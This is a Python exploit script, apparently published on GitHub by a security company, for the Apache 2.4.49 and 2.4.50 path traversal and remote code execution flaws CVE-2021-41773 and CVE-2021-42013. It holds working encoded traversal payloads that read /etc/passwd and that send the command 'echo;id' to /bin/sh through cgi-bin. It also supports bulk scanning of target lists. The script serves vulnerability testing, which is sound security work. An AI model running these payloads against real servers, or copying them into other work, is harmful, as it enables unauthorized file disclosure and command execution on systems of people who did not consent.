# https://github.com/walnutsecurity/cve-2021-42013/tree/main


#!/usr/bin/python

'''
CVE: 2021-42013
Tested on: 2.4.49 and 2.4.50
Description: Path Traversal or Remote Code Execution vulnerabilities were found in Apache 2.4.49 and 2.4.50
Script Author: @nirav4peace
Company: Walnut Security Services Pvt. Ltd.
Website: https://walnutsecurity.com
'''

import os
import sys
import requests  # type: ignore
import argparse
import urllib
from os import path

#User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

#Usage Instructions
usage = "\n- cve-2021-42013.py -u domain.com\n- cve-2021-42013.py -u domain.com -pt\n- cve-2021-42013.py -u domain.com -rce"
description = "cve-2021-42013.py is a python script to check for Path Traversal or Remote Code Execution vulnerability in Apache 2.4.50"

#Arguments Parser
parser = argparse.ArgumentParser(usage=usage, description=description)
parser.add_argument("-u", dest="url", type=str, help="Specify a domain/ip to scan for CVE-2021-42013.")
parser.add_argument("-pt", dest="pt", action="store_true", help="This will check only for Path Traversal vulnerability.")
parser.add_argument("-rce", dest="rce", action="store_true", help="This will check only for Remote Code Execution vulnerability.")
parser.add_argument("-l", dest="list", help="Specify a file to bulk scan for CVE-2021-42013.")
args = parser.parse_args()

vuln_ind = 0

#Check for valid URL format and connectivity
def urlCheck(url):
    try:
        try:
            try:
                try:
                    try:
                    	resp = requests.head(url, headers={"User-Agent": user_agent})
                    	return resp
                    except requests.exceptions.InvalidURL:
                    	print ("\n[-] Provided URL is invalid. Please specify valid URL.\n")
                    	sys.exit()
                except requests.exceptions.InvalidSchema:
                    print ("\n[-] You have provided wrong protocol in "+url+", it must be (http:// or https://)\n")
                    sys.exit()
            except requests.exceptions.MissingSchema:
                print ("\n[-] You need to specify protocol (http:// or https://) in "+url+"\n")
                sys.exit()
        except requests.exceptions.ReadTimeout:
            print ("\n[-] Server has not responded within 10s for the domain "+url+"\n")
            sys.exit()
    except requests.exceptions.ConnectionError:
        print ("\n[-] Unable to connect to the domain "+url+"\n")
        sys.exit()

def exploitPT(payload, cve_id):
	payload = url + urllib.parse.quote(payload, safe="/%")
	print ("[+] Executing payload "+payload)
	try:
		request = urllib.request.Request(payload, headers={"User-Agent": user_agent})
		response = urllib.request.urlopen(request)
		res = response.read().decode("utf-8")
		if "root:" in res:
			print ("[!] "+url+" is vulnerable to Path Traversal Attack ("+cve_id+")")
			print ("[+] Response:")
			print (res)
			global vuln_ind
			vuln_ind =+ 1 
		else:
			print ("[!] "+url+" is not vulnerable to "+cve_id+"\n")
	except urllib.error.HTTPError:
		print ("[!] "+url+" is not vulnerable to "+cve_id+"\n")

def exploitRCE(payload, cve_id):
	payload = url + urllib.parse.quote(payload, safe="/%")
	data = "echo;id"
	data = data.encode("ascii")
	print ("[+] Executing payload "+payload)
	try:
		request = urllib.request.Request(payload, data=data, headers={"User-Agent": user_agent})
		response = urllib.request.urlopen(request)
		res = response.read().decode("utf-8")
		if "uid=" in res:
			print ("[!] "+url+" is vulnerable to Remote Code Execution attack ("+cve_id+")")
			print ("[+] Response:")
			print (res)
		else:
			print ("[!] "+url+" is not vulnerable to "+cve_id+"\n")
	except urllib.error.HTTPError:
		print ("[!] "+url+" is not vulnerable to "+cve_id+"\n")

def pathTraversal(url):
	resp = urlCheck(url)
	version = resp.headers['server']
	if "49" in version:
		cve_id = "CVE-2021-41773"
		payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 
		exploitPT(payload, cve_id)

	elif "50" in version:
		cve_id = "CVE-2021-42013"
		payload = "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
		exploitPT(payload, cve_id)

	else:
		cve_id = "CVE-2021-41773"
		payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 
		exploitPT(payload, cve_id)
		if vuln_ind == 0:
			cve_id = "CVE-2021-42013"
			payload = "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
			exploitPT(payload, cve_id)
			
def RCE(url):
	resp = urlCheck(url)
	version = resp.headers['server']
	if "49" in version:
		cve_id = "CVE-2021-41773"
		payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
		exploitRCE(payload, cve_id)

	elif "50" in version:
		cve_id = "CVE-2021-42013"
		payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
		exploitRCE(payload, cve_id)

	else:
		cve_id = "CVE-2021-41773"
		payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" 
		exploitRCE(payload, cve_id)
		if vuln_ind == 0:
			cve_id = "CVE-2021-42013"
			payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
			exploitRCE(payload, cve_id)

def execute(url):
	ind=0
	if args.pt:
		pathTraversal(url)
		ind = 1
	if args.rce:
		RCE(url)
		ind = 1
	if ind == 0:
		pathTraversal(url)
		RCE(url)

if args.url and args.list:
	print("[-] Specify only one parameter '-u' or '-l'")
	
elif args.url:
	url = args.url
	execute(url)
	
elif args.list:
	if not os.path.exists(args.list):
		print ("\n[-] No such list found in the given path.\n")
		sys.exit()
	lists = open(args.list).read().splitlines()
	for url in lists:
		execute(url)
else:
	print("[-] No parameters given. Please see help by '-h'\n")
	sys.exit()